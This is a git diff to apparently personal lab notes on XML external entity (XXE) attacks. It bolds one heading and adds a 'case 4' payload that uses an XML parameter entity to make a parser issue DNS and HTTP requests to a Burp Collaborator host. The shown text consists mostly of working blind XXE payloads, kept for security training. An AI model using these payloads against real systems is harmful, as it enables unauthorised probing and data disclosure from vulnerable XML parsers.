@@ -71,7 +71,7 @@ payloads
 
             }"
 ```
-## case 3: Blind XXE with out-of-band interaction
+## **case 3: Blind XXE with out-of-band interaction**
 ``` secnerio: use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
     payloads:
     <?xml version="1.0" encoding="UTF-8"?>
@@ -80,6 +80,17 @@ payloads
             <productId>&xxe;</productId>
             <storeId>1</storeId>
         </stockCheck>
+```
+## **case4: Blind XXE with out-of-band interaction via XML parameter entities**
+``` secnerio: use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator
+
+   Payload:
+            <?xml version="1.0" encoding="UTF-8"?>
+                    <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://burp-collabrator-subdomain/"> %xxe; ]>
+                    <stockCheck>
+                        <productId>1</productId>
+                        <storeId>1</storeId>
+                    </stockCheck>
 ```
 ---
 
